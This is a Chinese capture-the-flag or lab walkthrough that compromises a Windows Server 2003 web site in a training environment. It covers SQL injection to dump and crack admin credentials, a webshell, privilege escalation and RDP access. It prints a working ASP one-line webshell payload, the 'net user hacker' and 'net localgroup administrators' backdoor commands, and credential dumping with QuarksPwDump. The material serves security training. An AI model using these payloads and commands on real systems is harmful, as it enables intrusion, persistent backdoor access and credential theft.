Setp 0 实验环境操作机：Windows XP \[172.16.11.2\]  
目标机：Windows server 2003 \[172.16.12.2\]  
实验工具： 中国菜刀 Pr 御剑 Pangolin 3389  
本实验要求获取www.test.ichunqiu网站的服务器权限。Step 1 目录扫描目录扫描  
工具：御剑   
路径：C:\\Tools\\目录扫描\\  
打开御剑，在域名中输入http://www.test.ichunqiu，开始扫描；

![](../Images/0f3fec7d24e1d373e13a4f735b45b3b2.png)  

在目录列表中查找后台，发现存在/admin

![](../Images/8ba635ac9dd6758f6b3c7f6d0dd6814a.png)  

双击打开后台登录页面http://www.test.ichunqiu/admin

![](../Images/e321355e102a6c1c867bff28e4c9e31e.png)  

不过用户名和密码都不知道，没关系，进行下一步：获取用户名和密码。Step 2工具：旁注WEB综合检测程序Ver3.6修正版  
路径：C:\\Tools\\注入工具\\Domain3.6\\Domain3.6.exe

![](../Images/8f763bdd78e837f62a1186ddca9ab2da.png)  

打开工具，依次点击 \[SQL注入\] -->\[批量扫描注入点\] --> \[添加网址\] --> \[批量分析注入点\]；

![](../Images/71971ab395c4b0d997378587902405a3.png)  

出现下面这个对话框说明已经检测完毕；

![](../Images/edbbd590346159ed2f7ea469244b6a96.png)  

点击OK进行下一步；  
注入点分析完毕后，会在下方列表中显示可注入的地址，选择其中一个地址，右键选择 \[检测注入\]；

![](../Images/6e25030019e64a5623e4d8bd3677c69c.png)  

点击 \[检测注入\] 后，主界面从 \[批量扫描注入点\] 转到 \[SQL注入猜解检测\]，点击 \[开始检测\]；

![](../Images/e04ca30effdd134b01f49fde2ec94668.png)  

检测完毕后，显示可以注入，并列出了数据库类型：Access数据库；

![](../Images/26703f9bf422de52f953feaa2bb7b5e5.png)  

下面开始逐步 \[猜解表名\] -->\[猜解列名\]--> \[猜解内容\]；点击 \[猜解表名\] 后，在数据库列表中会显示4个表，分别是admin、user、movie和news；

![](../Images/5062f8d2480ce1a8cb0c67fab7be2704.png)  

选择admin表，点击 \[猜解列名\]，成功猜解出三个列名id、username和password；

![](../Images/fee66f07ae57def578fb9f02a8859f05.png)  

勾选username和password，点击 \[猜解内容\]，右侧列表中成功显示用户名admin，密码469e80d32c0559f8

![](../Images/f3e9e2315c82e547982527bd8b9d8a93.png)  

当然密码是MD5加密的，打开本机浏览器，输入http://www.cmd5.com，输入刚刚查询到的密文，点击 \[解密\]；

![](../Images/0757a7b694f28ca12b65923eff918643.png)  

成功找到明文密码：admin888；  
注入的方法与工具很多，或者也可以这样：在浏览器中打开网站首页http://www.test.ichunqiu，在最新产品中随便选择一个打开 \[注入点太多\]；

![](../Images/5a18f90670326e3ea874ba328ec23159.png)

![](../Images/7070eb79dfb91f79228981b74ef41794.png)

复制URL \[www.test.ichunqiu/ProductShow.asp?ID=7\]，使用工具：穿山甲  
工具：\[穿山甲Pangolin\]   
路径： C:\\Tools\\注入工具\\pangolin  
Pangolin是一款帮助渗透测试人员进行Sql注入测试的安全工具。所谓的SQL注入测试就是通过利用目标网站的某个页面缺少对用户传递参数控制或者控制的不够好的情况下出现的漏洞，从而达到获取、修改、删除数据，甚至控制数据库服务器、Web服务器的目的的测试方法；

![](../Images/4927210ae38247b6969f2271f69f23c7.png)  

打开穿山甲，输入URL，点击绿色三角箭头进行注入操作；

![](../Images/a3273370a388f7f02aaae2d9160cb1ab.png)  

点击 \[Dates\] 切换到Dates选项卡，点击 \[Tables\] 成功猜解出4张表；

![](../Images/c3e4570745e6e4f74070eac729e0c842.png)  

获取内容的原理同Domain的使用方法一样，\[猜解表名\]-->\[猜解列名\]-->\[猜解内容\]；  
  
同样能获取用户名和密码；

![](../Images/f71c60fb42afc8f2a3ff674cf8031592.png)  

下一步：登录后台，上传木马；Setp 3打开后台登录页面，输入用户名admin，密码admin888，输入验证码，点击 \[ENTER\] 登录后台；

![](../Images/f1bdf613a72eb23e87c140298cac1386.png)  

久违的后台终于进去了….

![](../Images/3ad10c70a7d0540ddec796f98ea0631c.png)  

点击左侧菜单栏中的 \[系统设置管理\]-->\[网站信息配置\]，用修改配置文件的方法获取WebShell；

![](../Images/cd304e4b2f2ff1d3a24e4815b36ecd13.png)  

打开相应页面后，将 \[公司名称\] 内容修改为一句话木马 "%><%Eval Request(Chr(35))%><%'  
写一句话木马的时候注意闭合；

![](../Images/b5a062aca7812eb05cdf94fa2c05e480.png)  

点击最下面的 \[保存设置\] 按钮；

![](../Images/d44851ee0eaaeefcb7baa8bd3d320a80.png)

如果插马成功，\[公司名称\] 内容为空；

![](../Images/dc47f024dc582477d0beaa2c4a2e33d4.png)

打开 \[中国菜刀\] 连接一句话木马；  
工具：中国菜刀 路径：C:\\Tools\\webshell\\中国菜刀

![](../Images/5d290072728e9c0c125600efb3f9f38b.png)

打开菜刀，右键空白处，选择 \[添加\]；

![](../Images/59f25872b3fdbeb4873014caf5fe62e4.png)

在地址栏中输入http://www.test.ichunqiu/inc/config.asp，为什么是这个路径？因为我们刚才修改的网站信息配置页面，就是这个路径，可以自己下载一个魅力企业网站管理系统源码看看，2007或2009版的都行，里面的目录结构一目了然；  
连接密码为#，密码为什么是#？ 往上看一句话木马，里面有个chr(35)，#的ascii码就是35，当然这个密码可以随便设置，只要保证服务端一句话木马里的密码和添加SHELL时输入的密码一致即可，点击 \[添加\]；

![](../Images/b471798c97de141a159fc1b1a009ea46.png)

添加成功后会新增一条记录；

![](../Images/51c67f5f2c4d7536d79cef9c4969db7c.png)

双击这个URL，成功进入！

![](../Images/893b46d6b18706f4dec2d03dd174e40e.png)

提权工具包括pr，3389，cmd，路径：C:\\Tools\\提权工具\\windows

![](../Images/f29414624cde76cbe4a4b91bfeb80d0c.png)

开始上传工具，选中这三个文件，用鼠标直接拖到中国菜刀中，即可完成上传；

![](../Images/5fae641e7c7719370527a757428e350c.png)

上传成功；

右键cmd.exe，选择 \[虚拟终端\]

![](../Images/bfa129d891207a127702a9c2a275f044.png)  

成功进入，将目录切换到C:\\RECYCLER

![](../Images/5907e5910b02052b37f594ea876bb070.png)  

用pr.exe执行cmd命令，添加账户；  
pr "net user hacker 123 /add"  
第一次执行命令有可能不成功，怎么办？  

![](../Images/9ea457a0852a0157c815c3512eec37aa.png)  

没关系，再执行一次就OK了；  

![](../Images/62bd69eaa25ab9919ceb3f2cc1f988f1.png)  

账户添加成功，下一步，将hacker账户添加到系统管理员组；  
pr "net localgroup administrators hacker /add"  

![](../Images/22665928b505d134210c92622d7699e7.png)  

添加成功，下一步，开启3389；  
pr 3389  

![](../Images/0c057ca9dfa3affea950f2375e294ea0.png)  

如果出现如上图中的一大堆命令，说明执行成功了，不成功就多执行几次命令，下一步，连接目标机；  
\[开始\]-->\[运行\]-->mstsc  

![](../Images/538089b3cef415134adb4d90b3b3a739.png)  

如果找不见目标IP地址，请点击右上角 \[场景拓扑图\] 进行查看：  

![](../Images/2bf396d2bfdf23148b2417e419ec67ed.png)  

输入目标IP地址：172.16.12.2，开始连接，继续输入用户名hacker和密码123，进入系统；  

![](../Images/96caeb463b98669c749ee9cbd2fa1107.png)

上传成功，进入目标机，运行QuarksPwDump
